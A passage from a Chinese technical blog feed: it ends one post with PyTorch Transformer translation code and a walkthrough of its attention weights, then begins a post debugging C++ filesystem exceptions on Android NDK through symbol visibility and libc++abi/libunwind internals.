class TransformerDecoderBlock(nn.Module):
    # The i-th block in the Transformer decoder
    def __init__(self, num_hiddens, ffn_num_hiddens, num_heads, dropout, i):
        super().__init__()
        self.i = i
        self.attention1 = MultiHeadAttention(num_hiddens, num_heads,
                                                 dropout)
        self.addnorm1 = AddNorm(num_hiddens, dropout)
        self.attention2 = MultiHeadAttention(num_hiddens, num_heads,
                                                 dropout)
        self.addnorm2 = AddNorm(num_hiddens, dropout)
        self.ffn = PositionWiseFFN(ffn_num_hiddens, num_hiddens)
        self.addnorm3 = AddNorm(num_hiddens, dropout)

    def forward(self, X, state):
        enc_outputs, enc_valid_lens = state[0], state[1]
        # During training, all the tokens of any output sequence are processed
        # at the same time, so state[2][self.i] is None as initialized. When
        # decoding any output sequence token by token during prediction,
        # state[2][self.i] contains representations of the decoded output at
        # the i-th block up to the current time step
        if state[2][self.i] is None:
            key_values = X
        else:
            key_values = torch.cat((state[2][self.i], X), dim=1)
        state[2][self.i] = key_values
        if self.training:
            batch_size, num_steps, _ = X.shape
            # Shape of dec_valid_lens: (batch_size, num_steps), where every
            # row is [1, 2, ..., num_steps]
            dec_valid_lens = torch.arange(
                1, num_steps + 1, device=X.device).repeat(batch_size, 1)
        else:
            dec_valid_lens = None
        # Self-attention
        X2 = self.attention1(X, key_values, key_values, dec_valid_lens)
        Y = self.addnorm1(X, X2)
        # Encoder-decoder attention. Shape of enc_outputs:
        # (batch_size, num_steps, num_hiddens)
        Y2 = self.attention2(Y, enc_outputs, enc_outputs, enc_valid_lens)
        Z = self.addnorm2(Y, Y2)
        return self.addnorm3(Z, self.ffn(Z)), state
    

class TransformerDecoder(Decoder):
    def __init__(self, vocab_size, num_hiddens, ffn_num_hiddens, num_heads,
                 num_blks, dropout):
        super().__init__()
        self.num_hiddens = num_hiddens
        self.num_blks = num_blks
        self.embedding = nn.Embedding(vocab_size, num_hiddens)
        self.pos_encoding = PositionalEncoding(num_hiddens, dropout)
        self.blks = nn.Sequential()
        for i in range(num_blks):
            self.blks.add_module("block"+str(i), TransformerDecoderBlock(
                num_hiddens, ffn_num_hiddens, num_heads, dropout, i))
        self.dense = nn.LazyLinear(vocab_size)

    def init_state(self, enc_outputs, enc_valid_lens):
        return [enc_outputs, enc_valid_lens, [None] * self.num_blks]

    def forward(self, X, state):
        X = self.pos_encoding(self.embedding(X) * math.sqrt(self.num_hiddens))
        self._attention_weights = [[None] * len(self.blks) for _ in range (2)]
        for i, blk in enumerate(self.blks):
            X, state = blk(X, state)
            # Decoder self-attention weights
            self._attention_weights[0][
                i] = blk.attention1.attention.attention_weights
            # Encoder-decoder attention weights
            self._attention_weights[1][
                i] = blk.attention2.attention.attention_weights
        return self.dense(X), state

    @property
    def attention_weights(self):
        return self._attention_weights
    


def sequence_mask(X, valid_len, value=0):
    """在序列中屏蔽不相关的项"""
    maxlen = X.size(1)
    mask = torch.arange((maxlen), dtype=torch.float32,
                        device=X.device)[None, :] &lt; valid_len[:, None]
    X[~mask] = value
    return X

class MaskedSoftmaxCELoss(nn.CrossEntropyLoss):
    """带遮蔽的softmax交叉熵损失函数"""
    # pred的形状：(batch_size,num_steps,vocab_size)
    # label的形状：(batch_size,num_steps)
    # valid_len的形状：(batch_size,)
    def forward(self, pred, label, valid_len):
        weights = torch.ones_like(label)
        weights = sequence_mask(weights, valid_len)
        self.reduction='none'
        unweighted_loss = super(MaskedSoftmaxCELoss, self).forward(
            pred.permute(0, 2, 1), label)
        weighted_loss = (unweighted_loss * weights).mean(dim=1)
        return weighted_loss
    
def grad_clipping(net, theta):  #@save
    """裁剪梯度"""
    if isinstance(net, nn.Module):
        params = [p for p in net.parameters() if p.requires_grad]
    else:
        params = net.params
    norm = torch.sqrt(sum(torch.sum((p.grad ** 2)) for p in params))
    if norm > theta:
        for param in params:
            param.grad[:] *= theta / norm

def train_seq2seq(net, data_iter, lr, num_epochs, tgt_vocab, device):
    """训练序列到序列模型"""
    def xavier_init_weights(m):
        if type(m) == nn.Linear:
            nn.init.xavier_uniform_(m.weight)
        if type(m) == nn.GRU:
            for param in m._flat_weights_names:
                if "weight" in param:
                    nn.init.xavier_uniform_(m._parameters[param])

    net.apply(xavier_init_weights)
    net.to(device)
    optimizer = torch.optim.Adam(net.parameters(), lr=lr)
    loss = MaskedSoftmaxCELoss()
    net.train()
    vis = visdom.Visdom(env=u'test1', server="http://127.0.0.1", port=8097)
    animator = vis
    for epoch in range(num_epochs):
        timer = Timer()
        metric = Accumulator(2)  # 训练损失总和，词元数量
        for batch in data_iter:
            #清零（reset）优化器中的梯度缓存
            optimizer.zero_grad()
            # x.shape = [batch_size, num_steps]
            X, X_valid_len, Y, Y_valid_len = [x.to(device) for x in batch]
            # bos.shape = batch_size 个 bos-id
            bos = torch.tensor([tgt_vocab['&lt;bos>']] * Y.shape[0],
                          device=device).reshape(-1, 1)
            # dec_input.shape = (batch_size, num_steps)
            # 解码器的输入通常由序列的起始标志 bos 和目标序列（去掉末尾的部分 Y[:, :-1]）组成。
            dec_input = torch.cat([bos, Y[:, :-1]], 1)  # 强制教学
            # Y_hat的形状:(batch_size,num_steps,vocab_size)
            Y_hat, _ = net(X, dec_input, X_valid_len)
            l = loss(Y_hat, Y, Y_valid_len)
            l.sum().backward()      # 损失函数的标量进行“反向传播”
            grad_clipping(net, 1)
            num_tokens = Y_valid_len.sum()
            optimizer.step()
            with torch.no_grad():
                metric.add(l.sum(), num_tokens)

        if (epoch + 1) % 10 == 0:
            # print(predict('你是？'))
            # print(epoch)
            # animator.add(epoch + 1, )

            if epoch == 9:
                # 清空图表：使用空数组来替换现有内容
                vis.line(X=np.array([0]), Y=np.array([0]), win='train_ch8', update='replace')
            # _loss_val = l
            # _loss_val = _loss_val.cpu().sum().detach().numpy()
            vis.line(
                X=np.array([epoch + 1]),
                Y=[ metric[0] / metric[1]],
                win='train_ch8',
                update='append',
                opts=&#123;
                    'title': 'train_ch8',
                    'xlabel': 'epoch',
                    'ylabel': 'loss',
                    'linecolor': np.array([[0, 0, 255]]),  # 蓝色线条
                &#125;
            )
    print(f'loss &#123;metric[0] / metric[1]:.3f&#125;, &#123;metric[1] / timer.stop():.1f&#125; '
        f'tokens/sec on &#123;str(device)&#125;')
    torch.save(net.cpu().state_dict(), 'model_h.pt')  # [[6]]
    torch.save(net.cpu(), 'model.pt')  # [[6]]

def predict_seq2seq(net, src_sentence, src_vocab, tgt_vocab, num_steps,
                    device, save_attention_weights=False):
    """序列到序列模型的预测"""
    # 在预测时将net设置为评估模式
    net.eval()
    src_tokens = src_vocab[src_sentence.lower().split(' ')] + [
        src_vocab['&lt;eos>']]
    enc_valid_len = torch.tensor([len(src_tokens)], device=device)
    src_tokens = dataset.truncate_pad(src_tokens, num_steps, src_vocab['&lt;pad>'])
    # 添加批量轴
    enc_X = torch.unsqueeze(
        torch.tensor(src_tokens, dtype=torch.long, device=device), dim=0)
    enc_outputs = net.encoder(enc_X, enc_valid_len)
    dec_state = net.decoder.init_state(enc_outputs, enc_valid_len)
    # 添加批量轴
    dec_X = torch.unsqueeze(torch.tensor(
        [tgt_vocab['&lt;bos>']], dtype=torch.long, device=device), dim=0)
    output_seq, attention_weight_seq = [], []
    for _ in range(num_steps):
        Y, dec_state = net.decoder(dec_X, dec_state)
        # 我们使用具有预测最高可能性的词元，作为解码器在下一时间步的输入
        dec_X = Y.argmax(dim=2)
        pred = dec_X.squeeze(dim=0).type(torch.int32).item()
        # 保存注意力权重（稍后讨论）
        if save_attention_weights:
            # 2'st block&amp;2'st attention
            attention_weight_seq.append(net.decoder.attention_weights[1][1].cpu())
        # 一旦序列结束词元被预测，输出序列的生成就完成了
        if pred == tgt_vocab['&lt;eos>']:
            break
        output_seq.append(pred)
    return ' '.join(tgt_vocab.to_tokens(output_seq)), attention_weight_seq


def bleu(pred_seq, label_seq, k):  #@save
    """计算BLEU"""
    pred_tokens, label_tokens = pred_seq.split(' '), [i for i in label_seq]
    len_pred, len_label = len(pred_tokens), len(label_tokens)
    score = math.exp(min(0, 1 - len_label / len_pred))
    for n in range(1, k + 1):
        num_matches, label_subs = 0, collections.defaultdict(int)
        for i in range(len_label - n + 1):
            label_subs[' '.join(label_tokens[i: i + n])] += 1
        for i in range(len_pred - n + 1):
            if label_subs[' '.join(pred_tokens[i: i + n])] > 0:
                num_matches += 1
                label_subs[' '.join(pred_tokens[i: i + n])] -= 1
        score *= math.pow(num_matches / (len_pred - n + 1), math.pow(0.5, n))
    return score

def try_gpu(i=0):
    """如果存在，则返回gpu(i)，否则返回cpu()

    Defined in :numref:`sec_use_gpu`"""
    if torch.cuda.device_count() >= i + 1:
        return torch.device(f'cuda:&#123;i&#125;')
    return torch.device('cpu')


from matplotlib import pyplot as plt
import matplotlib
# from matplotlib_inline import backend_inline
def show_heatmaps(matrices, xlabel, ylabel, titles=None, figsize=(2.5, 2.5),
                  cmap='Reds'):
    """
    显示矩阵的热图（Heatmaps）。
    这个函数旨在以子图网格的形式绘制多个矩阵，通常用于可视化注意力权重等。

    参数:
        matrices (numpy.ndarray 或 torch.Tensor 数组): 
            一个四维数组，形状应为 (num_rows, num_cols, height, width)。
            其中，num_rows 和 num_cols 决定了子图网格的布局，
            height 和 width 是每个热图（即每个矩阵）的维度。
        xlabel (str): 
            所有最底行子图的 x 轴标签。
        ylabel (str): 
            所有最左列子图的 y 轴标签。
        titles (list of str, optional): 
            一个包含 num_cols 个标题的列表，用于设置每一列子图的标题。默认 None。
        figsize (tuple, optional): 
            整个图形（figure）的大小。默认 (2.5, 2.5)。
        cmap (str, optional): 
            用于绘制热图的颜色映射（colormap）。默认 'Reds'。
    """
    # 导入所需的 matplotlib 模块，确保图形在 Jupyter/IPython 环境中正确显示为 SVG 格式
    # （假设在包含这个函数的环境中已经导入了 matplotlib 的 backend_inline）
    # backend_inline.set_matplotlib_formats('svg')
    matplotlib.use('TkAgg')
    # 从输入的 matrices 形状中解构出子图网格的行数和列数
    # 假设 matrices 的形状是 (num_rows, num_cols, height, width)
    num_rows, num_cols, _, _ = matrices.shape
    
    # 创建一个包含多个子图（axes）的图形（fig）
    # fig: 整个图形对象
    # axes: 一个 num_rows x num_cols 的子图对象数组
    fig, axes = plt.subplots(
        num_rows, num_cols, 
        figsize=figsize,
        sharex=True,    # 所有子图共享 x 轴刻度
        sharey=True,    # 所有子图共享 y 轴刻度
        squeeze=False   # 即使只有一行或一列，也强制返回二维数组的 axes，方便后续循环
    )
    
    # 遍历子图的行和对应的矩阵行
    # i 是行索引, row_axes 是当前行的子图数组, row_matrices 是当前行的矩阵数组
    for i, (row_axes, row_matrices) in enumerate(zip(axes, matrices)):
        # 遍历当前行中的子图和对应的矩阵
        # j 是列索引, ax 是当前的子图对象, matrix 是当前的待绘矩阵
        for j, (ax, matrix) in enumerate(zip(row_axes, row_matrices)):
            
            # 使用 ax.imshow() 绘制热图
            # matrix.detach().numpy()：将 PyTorch Tensor 转换为 numpy 数组，并从计算图中分离（如果它是 Tensor）
            # cmap：指定颜色映射
            pcm = ax.imshow(matrix.detach().numpy(), cmap=cmap)
            
            # --- 设置轴标签和标题 ---
            
            # 只有最底行 (i == num_rows - 1) 的子图才显示 x 轴标签
            if i == num_rows - 1:
                ax.set_xlabel(xlabel)
                
            # 只有最左列 (j == 0) 的子图才显示 y 轴标签
            if j == 0:
                ax.set_ylabel(ylabel)
                
            # 如果提供了标题列表，则设置当前列的子图标题（所有行共享列标题）
            if titles:
                ax.set_title(titles[j])
                
    # --- 添加颜色条（Colorbar） ---
    
    # 为整个图形添加一个颜色条，用于表示数值和颜色的对应关系
    # pcm: 之前绘制的第一个热图返回的 Colormap 
    # ax=axes: 颜色条将参照整个子图网格进行定位和缩放
    # shrink=0.6: 缩小颜色条的高度/长度，使其只占图形高度的 60%
    fig.colorbar(pcm, ax=axes, shrink=0.6)
    plt.show()

if __name__ == '__main__':
    num_hiddens, num_blks, dropout = 256, 2, 0.2
    ffn_num_hiddens, num_heads = 64, 4
    batch_size = 1024
    num_steps = 10
    lr, num_epochs, device = 0.001, 2000, try_gpu()

    train_iter, src_vocab, tgt_vocab, source, target = dataset.load_data(batch_size, num_steps)

    encoder = TransformerEncoder(
        len(src_vocab), num_hiddens, ffn_num_hiddens, num_heads,
        num_blks, dropout)
    decoder = TransformerDecoder(
        len(tgt_vocab), num_hiddens, ffn_num_hiddens, num_heads,
        num_blks, dropout)

    net = EncoderDecoder(encoder, decoder)
    
    is_train = False
    is_show = True
    if is_train:
        train_seq2seq(net, train_iter, lr, num_epochs, tgt_vocab, device)
    elif is_show:
        state_dict = torch.load('model_h.pt')
        net.load_state_dict(state_dict)
        net.to(device)

        src_text = "Call us."
        translation, attention_weight_seq = predict_seq2seq(
                net, src_text, src_vocab, tgt_vocab, num_steps, device, True)
        # attention_weights = torch.eye(10).reshape((1, 1, 10, 10))
        # (num_rows, num_cols, height, width)
        print(f'translation=&#123;translation&#125;')
        # print(attention_weight_seq.shape)
        
        stacked_tensor = torch.stack(attention_weight_seq, dim=0).permute(2, 1, 0, 3)
        print(stacked_tensor.shape)
        show_heatmaps(
            stacked_tensor,
            xlabel='Attention weight', ylabel='Decode Step', titles=['Head %d' % i for i in range(1, 5)])
    else:
        state_dict = torch.load('model_h.pt')
        net.load_state_dict(state_dict)
        net.to(device)
        C = 0
        C1 = 0
        for i in range(2000):
            # print(source[i])
            # print(target[i])
            translation, attention_weight_seq = predict_seq2seq(
                net, source[i], src_vocab, tgt_vocab, num_steps, device)
            
            score = bleu(translation, target[i], k=2)
            if score > 0.0:
                C = C + 1
                if score > 0.8:
                    C1 = C1 + 1
                print(f'&#123;source[i]&#125; => &#123;translation&#125;, bleu &#123;score:.3f&#125;')

        print(f'Counter(bleu > 0) = &#123;C&#125;')
        print(f'Valid-Counter(bleu > 0.8) = &#123;C1&#125;')
  我们先看一下TransformerEncoder做了什么：


和前面类似，首先输入做了embedding，然后叠加位置编码


然后循环计算每一个TransformerEncoderBlock


  TransformerEncoderBlock中做了：


计算自注意力


残差连接和层归一化


位置前馈网络


残差连接和层归一化


  然后我们来看看TransformerDecoder做了什么：


和TransformerEncoder类似，首先输入做了embedding，然后叠加位置编码


然后循环计算每一个TransformerDecoderBlock


最后接一个全连接，映射到词表大小


  TransformerDecoderBlock做了：


首先准备自注意力的$K_1 V_1$，其更新过程是每次输入X的拼接过程


将输入X 作为Q，$K_1 V_1$作为KV开始自注意力的运算过程


残差连接和层归一化，得到Y


将enc_output作为KV, Y作为Q，计算编码器-解码器注意力


残差连接和层归一化


位置前馈网络


残差连接和层归一化


  下面是训练和测试的一些结果

    
        
    
   

    
        
    
   
  从上面的图可以看到，这个模型的效果比seq2seq原始模型、seq2seq带注意力的模型要好很多。
  此外，下面是我们翻译：“Call us.”-&gt; “联 系 我 们 。” 的attention weight的可视化（block=2, head=4, mask=3）

    
        
    
   
  从每一个decode step的每个head的注意力权重来看，不同head关注了不一样的重点，有效的识别了特征中的多种属性，提高了模型的能力。




后记

    本文介绍了transformer结构以及其示例，这里也引入了很多现在LLM的很多概念，例如：位置编码等。
参考文献


https://d2l.ai/chapter_attention-mechanisms-and-transformers/transformer.html







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>深度学习</category>
        <category>NLP</category>
        <category>LLM</category>
        <category>LM</category>
      </categories>
      <tags>
        <tag>深度学习</tag>
        <tag>NLP</tag>
        <tag>LLM</tag>
        <tag>LM</tag>
        <tag>seq2seq</tag>
        <tag>attention</tag>
        <tag>transformer</tag>
      </tags>
  </entry>
  <entry>
    <title>一次酣畅淋漓的问题排查（c++标准库异常实现原理）</title>
    <url>/2025/12/28/blog_idx_146/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  在集成和定制llama.cpp工程的时候，做了许多工作，也遇到了很多问题，但是绝大部分问题都是很快就能解决的，少部分问题花一些时间也能解决掉，其中有两个关联问题是让我最印象深刻的。为了整理和探究这两个问题的根源，特在此编写本文。且在写本文这段时间内，也整理和提了一个关联的pr给llama.cpp（https://github.com/ggml-org/llama.cpp/pull/17653）。
  首先我们有如下的代码示例：
try&#123;
    &#123;
        &#x2F;&#x2F; ... ...
        if (!std::filesystem::exists(&quot;&#x2F;bugreports&quot;))

        &#x2F;&#x2F; ... ...
    &#125;

    &#123;
        std::filesystem::directory_iterator dir_it(&quot;&#x2F;&quot;, fs::directory_options::skip_permission_denied);
        for (const auto &amp; entry : dir_it) &#123;
            &#x2F;&#x2F; ... ...
        &#125;
        &#x2F;&#x2F; ... ...
    &#125;

    return ;
&#125;
catch (const std::exception&amp; e)&#123;
    printf(&quot;exception: %s\n&quot;, e.what());
    return ;
&#125;
catch(...)&#123;
    printf(&quot;Fatal Error, Unkown exception\n&quot;);
    return ;
&#125;
  根据上面的代码示例，在不同的编译条件、同一个执行环境(软、硬件)下它3个code-block分支都会走，这让我简直头大。下面是两个catch-code-block部分的输出：
exception: filesystem error: in posix_stat: failed to determine attributes for the specified path: Permission denied ["/bugreports"]
Fatal Error, Unkown exception
  当然，上面的3个code-block其实对应这几个问题：


为什么同一个设备，同一段代码在不同条件下执行3个不同的分支，尤其是什么情况下正常执行，什么情况下抛出异常？


std::filesystem::exists/std::filesystem::directory_iterator 什么情况下会抛出异常？


对于std::filesystem::exists/std::filesystem::directory_iterator抛出的异常来说，为什么捕获路径不一样（是否能抓到filesystem error）？


  下面我们分别对这几个问题进行分析(以std::filesystem::exists为例)。




问题初步分析

  


为什么同一设备，同一代码，不同编译条件可以正常或者异常运行?
  在我的例子里面，根据我的实际测试反馈来看，在build.gradle里面，【 compileSdk = 34，minSdk = 34，ndk=26】【 compileSdk = 34，minSdk = 34，ndk=26】两种不同配置，导致运行结果不一样，当minSdk=26时，代码会抛出异常，当minSdk=34时，代码正常运行。
  经过上面的分析和测试，我们可以得到一个猜（可能性极大）的原因：因为ndk版本是一样的，意味着上面的标准库实现是一样的，因此这个现象的主要原因还是不同的编译条件，让我们使用posix api访问/bugreports目录时，posix api有不同的返回。
  更底层的原因导致posix api有不同的返回，我不是很了解、不熟悉android的底层系统细节，因此就不继续排查了，有缘再说，下次一定。
  接着我们排查一下c++标准库的std::filesystem::exists实现，看看异常从哪里来？


什么情况下std::filesystem::exists会抛出异常？
  我们先查看https://en.cppreference.com/w/cpp/filesystem/exists.html，其定义如下：
bool exists( std::filesystem::file_status s ) noexcept; (1)	(since C++17)
bool exists( const std::filesystem::path&amp; p ); (2)	(since C++17)
bool exists( const std::filesystem::path&amp; p, std::error_code&amp; ec ) noexcept; (3)	(since C++17)

&#x2F;*
    Exceptions
        Any overload not marked noexcept may throw std::bad_alloc if memory allocation fails.

        2) Throws std::filesystem::filesystem_error on underlying OS API errors, constructed with p as the first path argument and the OS error code as the error code argument.
*&#x2F;
  因此，对于我们上文的用法，如果底层OS的API出现问题，那么会抛出异常，这个现象是符合标准定义的。
   下面我们来看看exists的源码具体实现（libcxx）：
inline _LIBCPP_HIDE_FROM_ABI bool exists(const path&amp; __p) &#123; return exists(__status(__p)); &#125;

_LIBCPP_EXPORTED_FROM_ABI file_status __status(const path&amp;, error_code* __ec &#x3D; nullptr); 

file_status __status(const path&amp; p, error_code* ec) &#123; return detail::posix_stat(p, ec); &#125;


inline file_status posix_stat(path const&amp; p, error_code* ec) &#123;
  StatT path_stat;
  return posix_stat(p, path_stat, ec);
&#125;

inline file_status posix_stat(path const&amp; p, StatT&amp; path_stat, error_code* ec) &#123;
  error_code m_ec;
  if (detail::stat(p.c_str(), &amp;path_stat) &#x3D;&#x3D; -1)
    m_ec &#x3D; detail::capture_errno();
  return create_file_status(m_ec, p, path_stat, ec);
&#125;

namespace detail &#123;
using ::stat; &#x2F;&#x2F;&lt;sys&#x2F;stat.h&gt;
&#125; &#x2F;&#x2F; end namespace detail

inline file_status create_file_status(error_code&amp; m_ec, path const&amp; p, const StatT&amp; path_stat, error_code* ec) &#123;
  if (ec)
    *ec &#x3D; m_ec;
  if (m_ec &amp;&amp; (m_ec.value() &#x3D;&#x3D; ENOENT || m_ec.value() &#x3D;&#x3D; ENOTDIR)) &#123;
    return file_status(file_type::not_found);
  &#125; else if (m_ec) &#123;
    ErrorHandler&lt;void&gt; err(&quot;posix_stat&quot;, ec, &amp;p);
    err.report(m_ec, &quot;failed to determine attributes for the specified path&quot;);
    return file_status(file_type::none);
  &#125;

  &#x2F;&#x2F; ... ... other code
&#125;
  因此exists()抛异常的根本原因就是，调用detail::stat的时候，产生了Permission denied 错误，然后在create_file_status中抛出了异常。


对于std::filesystem::filesystem_error异常，在不同位置捕获的原因？
  根据上面的最小化测试代码，再一次对整体构建过程进行排查后，有如下发现：


当上面的代码在一个so中，如果启用了-Wl,–version-script功能，导致未导出vtable和typeinfo对象的符号(Android)。


在x86里面构建上面同样的实例时，发现启用了-Wl,–version-script功能，默认也能导出了vtable和typeinfo对象的符号。


  上面的现象把我搞郁闷了，经过编译器、链接器、编译参数、链接参数和符号等相关的排查，终于在一个位置发现了一些奇怪的东西：
#  readelf -sW build/libnativelib.so|grep fs10filesystem16filesystem_errorE
# 下面的so能在catch (const std::exception&amp; e)中捕获异常，nm -CD 也有fs10filesystem16filesystem_errorE相关的符号
  12: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND _ZTINSt6__ndk14__fs10filesystem16filesystem_errorE
  18: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND _ZTVNSt6__ndk14__fs10filesystem16filesystem_errorE
 235: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND _ZTINSt6__ndk14__fs10filesystem16filesystem_errorE
 241: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND _ZTVNSt6__ndk14__fs10filesystem16filesystem_errorE

# 下面的so只能在catch(...)捕获异常，nm -CD 没有fs10filesystem16filesystem_errorE相关的符号
 393: 0000000000036340    24 OBJECT  LOCAL  DEFAULT   17 _ZTINSt6__ndk14__fs10filesystem16filesystem_errorE
 395: 0000000000036318    40 OBJECT  LOCAL  DEFAULT   17 _ZTVNSt6__ndk14__fs10filesystem16filesystem_errorE
 410: 000000000000ad5a    47 OBJECT  LOCAL  DEFAULT   11 _ZTSNSt6__ndk14__fs10filesystem16filesystem_errorE
  上面我们可以知道，正常的so，其相关的typeinfo/vtable是GLOBAL 且未定义的，其定义应该在libc++.so或者libstdc++.so的。而异常的so相关的typeinfo/vtable的符号是LOCAL且已经定义了。
  经过一系列查询，上面问题的差异出在ANDROID_STL在cmake中默认是c++_static的(https://developer.android.com/ndk/guides/cpp-support?hl=zh-cn#selecting_a_c_runtime)，这个时候c标准库的实现是以静态库的方式链接到我的so，因此相关的实现是local的，现在只需要改为c_shared就解决了上面的异常路径不一致的情况。
  此外，当我还是用c++_static继续编译，只是手动把typeinfo/vtable的符号都导出为依赖libc++.so或者libstdc++.so时，发现也能够正常捕获异常了。
  上面我们只是找到了引起问题的地方，但是没有回答，为什么nm -CD 没有fs10filesystem16filesystem_errorE相关的typeinfo/vtable符号的时候，只有catch(…)能捕获异常。要回答这个问题，我们得去初步看一下c++异常机制是怎么实现的，下面我们继续分析。




c++标准库异常实现原理简单分析
  为了尽可能的贴近我的遇到问题的场景和方便调试，且不同ABI的异常实现可能不一致，下面基于clang，x64，来分析c异常实现的基本原理（Itanium C ABI）。
  首先我们来看看我们throw一个异常的时候调用的汇编代码是什么？
extern &quot;C&quot; __attribute__((visibility(&quot;default&quot;))) void pp()
&#123;
  throw std::runtime_error(&quot;test_exception&quot;);
&#125;
   0x00007ffff7f9a380 &lt;+0>:     push   %rbp
   0x00007ffff7f9a381 &lt;+1>:     mov    %rsp,%rbp
   0x00007ffff7f9a384 &lt;+4>:     sub    $0x20,%rsp
   0x00007ffff7f9a388 &lt;+8>:     mov    $0x10,%edi
=> 0x00007ffff7f9a38d &lt;+13>:    call   0x7ffff7fb48e0 &lt;__cxa_allocate_exception>
   0x00007ffff7f9a392 &lt;+18>:    mov    %rax,%rdi
   0x00007ffff7f9a395 &lt;+21>:    mov    %rdi,%rax
   0x00007ffff7f9a398 &lt;+24>:    mov    %rax,-0x18(%rbp)
   0x00007ffff7f9a39c &lt;+28>:    lea    -0x902d(%rip),%rsi        # 0x7ffff7f91376
   0x00007ffff7f9a3a3 &lt;+35>:    call   0x7ffff7fb5e80 &lt;_ZNSt13runtime_errorC2EPKc>
   0x00007ffff7f9a3a8 &lt;+40>:    jmp    0x7ffff7f9a3ad &lt;pp()+45>
   0x00007ffff7f9a3ad &lt;+45>:    mov    -0x18(%rbp),%rdi
   0x00007ffff7f9a3b1 &lt;+49>:    lea    0x1d158(%rip),%rsi        # 0x7ffff7fb7510 &lt;_ZTISt13runtime_error>
   0x00007ffff7f9a3b8 &lt;+56>:    lea    0xb1(%rip),%rdx        # 0x7ffff7f9a470 &lt;_ZNSt15underflow_errorD2Ev>
   0x00007ffff7f9a3bf &lt;+63>:    call   0x7ffff7fb4b00 &lt;__cxa_throw>
   0x00007ffff7f9a3c4 &lt;+68>:    mov    -0x18(%rbp),%rdi
   0x00007ffff7f9a3c8 &lt;+72>:    mov    %rax,%rcx
   0x00007ffff7f9a3cb &lt;+75>:    mov    %edx,%eax
   0x00007ffff7f9a3cd &lt;+77>:    mov    %rcx,-0x8(%rbp)
   0x00007ffff7f9a3d1 &lt;+81>:    mov    %eax,-0xc(%rbp)
   0x00007ffff7f9a3d4 &lt;+84>:    call   0x7ffff7fb49c0 &lt;__cxa_free_exception>
   0x00007ffff7f9a3d9 &lt;+89>:    mov    -0x8(%rbp),%rdi
   0x00007ffff7f9a3dd &lt;+93>:    call   0x7ffff7fb6160 &lt;_Unwind_Resume@plt>
   从上面的代码可以知道，先调用__cxa_allocate_exception在特定空间分配内存（不是一般的堆栈空间，避免干扰堆栈），然后调用placement new 在前面的空间上面构造std::runtime_error对象，然后执行__cxa_throw开始堆栈展开，查找异常链。这个链接介绍了cpp标准里面对异常展开流程的描述（https://en.cppreference.com/w/cpp/language/throw.html）。
  下面我们通过查看__cxa_throw的源码，看看libc++对异常展开是怎么实现的。
libcxxabi\src\cxa_exception.cpp
void
__cxa_throw(void *thrown_object, std::type_info *tinfo, void (_LIBCXXABI_DTOR_FUNC *dest)(void *)) &#123;
    __cxa_eh_globals *globals &#x3D; __cxa_get_globals();
    __cxa_exception* exception_header &#x3D; cxa_exception_from_thrown_object(thrown_object);

    exception_header-&gt;unexpectedHandler &#x3D; std::get_unexpected();
    exception_header-&gt;terminateHandler  &#x3D; std::get_terminate();
    exception_header-&gt;exceptionType &#x3D; tinfo;
    exception_header-&gt;exceptionDestructor &#x3D; dest;
    setOurExceptionClass(&amp;exception_header-&gt;unwindHeader);
    exception_header-&gt;referenceCount &#x3D; 1;  &#x2F;&#x2F; This is a newly allocated exception, no need for thread safety.
    globals-&gt;uncaughtExceptions +&#x3D; 1;   &#x2F;&#x2F; Not atomically, since globals are thread-local

    exception_header-&gt;unwindHeader.exception_cleanup &#x3D; exception_cleanup_func;

#if __has_feature(address_sanitizer)
    &#x2F;&#x2F; Inform the ASan runtime that now might be a good time to clean stuff up.
    __asan_handle_no_return();
#endif

#ifdef __USING_SJLJ_EXCEPTIONS__
    _Unwind_SjLj_RaiseException(&amp;exception_header-&gt;unwindHeader);
#else
    _Unwind_RaiseException(&amp;exception_header-&gt;unwindHeader);
#endif
    &#x2F;&#x2F;  This only happens when there is no handler, or some unexpected unwinding
    &#x2F;&#x2F;     error happens.
    failed_throw(exception_header);
&#125;
  这里可以看到，首先函数3个参数分别是：刚刚的std::runtime_error对象，异常对象的typeinfo，std::runtime_error对应的析构函数。然后就开始根据不同的异常实现，开始展开堆栈。此外，这里有个地方可以值得注意：exceptionType 很明显就是我们本文的问题有关系，如果没有导出对应的typeinfo，很有可能在其他地方无法匹配这个异常。
  还有这里补充一个细节：现在常见的异常模型大概有3类，SJLJ（setjump-longjump），DWARF，SEH (Windows)，当前类linux用的异常模型是DWARF中的定义。
  根据上面的执行流，我们接着来看_Unwind_RaiseException的实现。
libunwind\src\UnwindLevel1.c
/// Called by __cxa_throw.  Only returns if there is a fatal error.
_LIBUNWIND_EXPORT _Unwind_Reason_Code
_Unwind_RaiseException(_Unwind_Exception *exception_object) &#123;
  _LIBUNWIND_TRACE_API("_Unwind_RaiseException(ex_obj=%p)",
                       static_cast&lt;void *>(exception_object));
  unw_context_t uc;
  unw_cursor_t cursor;
  __unw_getcontext(&amp;uc);

  // This field for is for compatibility with GCC to say this isn't a forced
  // unwind. EHABI #7.2
  exception_object->unwinder_cache.reserved1 = 0;

  // phase 1: the search phase
  _Unwind_Reason_Code phase1 = unwind_phase1(&amp;uc, &amp;cursor, exception_object);
  if (phase1 != _URC_NO_REASON)
    return phase1;

  // phase 2: the clean up phase
  return unwind_phase2(&amp;uc, &amp;cursor, exception_object, false);
&#125;
  从这里来看，异常展开分为了两个阶段，phase1和phase2，从备注来看就是搜索、清理。下面我们先来看unwind_phase1的做了什么。
libunwind\src\UnwindLevel1.c
static _Unwind_Reason_Code
unwind_phase1(unw_context_t *uc, unw_cursor_t *cursor, _Unwind_Exception *exception_object) &#123;
  __unw_init_local(cursor, uc);

  // Walk each frame looking for a place to stop.
  while (true) &#123;
    // Ask libunwind to get next frame (skip over first which is
    // _Unwind_RaiseException).
    int stepResult = __unw_step(cursor);
    // ... ...

    // See if frame has code to run (has personality routine).
    unw_proc_info_t frameInfo;
    unw_word_t sp;
